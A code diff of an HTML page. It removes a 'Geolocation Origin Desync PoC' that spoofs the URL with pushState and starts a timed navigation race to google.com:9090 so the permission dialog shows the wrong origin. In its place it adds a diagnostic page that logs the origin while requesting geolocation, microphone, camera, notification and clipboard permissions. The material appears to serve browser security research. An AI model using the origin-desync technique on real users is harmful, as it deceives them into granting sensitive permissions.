@@ -2,103 +2,262 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Geolocation Origin Desync PoC</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Permission Origin Full Test</title>
 
 <style>
 body {
-  margin: 0;
-  font-family: -apple-system, BlinkMacSystemFont, system-ui;
-  background: #f5f5f7;
+    font-family:sans-serif;
+    padding:20px;
 }
 
 button {
-  font-size: 15px;
-  padding: 10px 14px;
-  border-radius: 10px;
-  border: none;
-  background: #007aff;
-  color: #fff;
+    display:block;
+    margin:10px 0;
+    padding:12px;
+    width:260px;
 }
 
-#panel {
-  display: none;
-  max-width: 420px;
-  margin: 80px auto;
-  background: #fff;
-  padding: 24px;
-  border-radius: 16px;
-  box-shadow: 0 20px 60px rgba(0,0,0,.2);
-  text-align: center;
-}
-
-.notice {
-  margin-top: 14px;
-  font-size: 13px;
-  color: #b00020;
+pre {
+    background:#111;
+    color:#0f0;
+    padding:15px;
+    white-space:pre-wrap;
 }
 </style>
+
 </head>
 
 <body>
 
-<div style="text-align:center; margin-top:60px;">
-  <button id="trigger">Start PoC</button>
-</div>
+<h2>Browser Permission Origin Test</h2>
 
-<div id="panel">
-  <h2>Request Location</h2>
-  <p>Tap the button below to request Geolocation permission.</p>
+<button id="trigger">PushState /trusted</button>
 
-  <button onclick="getLocation()">Get Location</button>
-  <p id="output">Location: -</p>
+<button id="origin">Check Origin</button>
+<button id="geo">Geolocation</button>
+<button id="mic">Microphone</button>
+<button id="camera">Camera</button>
+<button id="notify">Notification</button>
+<button id="clipboard">Clipboard</button>
 
-  <div class="notice">
-    Demo only — observe origin shown in permission dialog
-  </div>
-</div>
+<pre id="out">Ready...</pre>
+
 
 <script>
-const panel   = document.getElementById('panel');
-const trigger = document.getElementById('trigger');
-const output  = document.getElementById('output');
 
-function getLocation() {
-  if (!navigator.geolocation) return;
+const out = document.getElementById("out");
 
-  navigator.geolocation.getCurrentPosition(
-    pos => {
-      output.textContent =
-        `${pos.coords.latitude}, ${pos.coords.longitude}`;
-    },
-    () => {
-      output.textContent = 'Permission denied';
-    }
-  );
+function show(data){
+    out.textContent =
+    JSON.stringify(data,null,2);
 }
 
-/*
- * Step 1:
- * Manipulate visible URL to a trusted-looking path
- */
-trigger.onclick = () => {
-  history.pushState({}, '', '/trusted');
-  panel.style.display = 'block';
+
+function state(){
+    return {
+        href: location.href,
+        origin: location.origin,
+        protocol: location.protocol,
+        secureContext: window.isSecureContext,
+        time: Date.now()
+    };
+}
+
+
+// PushState
+
+document.getElementById("trigger").onclick = ()=>{
+
+history.pushState({}, "", "/trusted");
+
+show({
+    api:"pushState",
+    status:"done",
+    ...state()
+});
+
 };
 
-/*
- * Step 2:
- * Trigger a navigation race shortly after permission flow starts
- */
-window.addEventListener('pageshow', () => {
-  requestAnimationFrame(() => {
-    requestAnimationFrame(() => {
-      setTimeout(() => {
-        location.href = 'https://google.com:9090';
-      }, 80);
-    });
-  });
+
+// Origin
+
+document.getElementById("origin").onclick = ()=>{
+
+show({
+    api:"origin",
+    ...state()
 });
+
+};
+
+
+// Geolocation
+
+document.getElementById("geo").onclick = ()=>{
+
+navigator.geolocation.getCurrentPosition(
+
+pos=>{
+
+show({
+    api:"geolocation",
+    status:"granted",
+    ...state()
+});
+
+},
+
+err=>{
+
+show({
+    api:"geolocation",
+    status:"failed",
+    error:err.message,
+    ...state()
+});
+
+}
+
+);
+
+};
+
+
+// Microphone
+
+document.getElementById("mic").onclick = async()=>{
+
+try{
+
+const stream =
+await navigator.mediaDevices.getUserMedia({
+    audio:true
+});
+
+
+show({
+    api:"microphone",
+    status:"granted",
+    ...state()
+});
+
+
+stream.getTracks().forEach(t=>t.stop());
+
+
+}catch(e){
+
+show({
+    api:"microphone",
+    status:"failed",
+    error:e.name,
+    message:e.message,
+    ...state()
+});
+
+}
+
+};
+
+
+// Camera
+
+document.getElementById("camera").onclick = async()=>{
+
+try{
+
+const stream =
+await navigator.mediaDevices.getUserMedia({
+    video:true
+});
+
+
+show({
+    api:"camera",
+    status:"granted",
+    ...state()
+});
+
+
+stream.getTracks().forEach(t=>t.stop());
+
+
+}catch(e){
+
+show({
+    api:"camera",
+    status:"failed",
+    error:e.name,
+    message:e.message,
+    ...state()
+});
+
+}
+
+};
+
+
+// Notification
+
+document.getElementById("notify").onclick = async()=>{
+
+try{
+
+const result =
+await Notification.requestPermission();
+
+
+show({
+    api:"notification",
+    status:result,
+    ...state()
+});
+
+
+}catch(e){
+
+show({
+    api:"notification",
+    status:"failed",
+    error:e.message,
+    ...state()
+});
+
+}
+
+};
+
+
+// Clipboard
+
+document.getElementById("clipboard").onclick = async()=>{
+
+try{
+
+await navigator.clipboard.readText();
+
+
+show({
+    api:"clipboard",
+    status:"granted",
+    ...state()
+});
+
+
+}catch(e){
+
+show({
+    api:"clipboard",
+    status:"failed",
+    error:e.message,
+    ...state()
+});
+
+}
+
+};
+
 </script>
 
 </body>
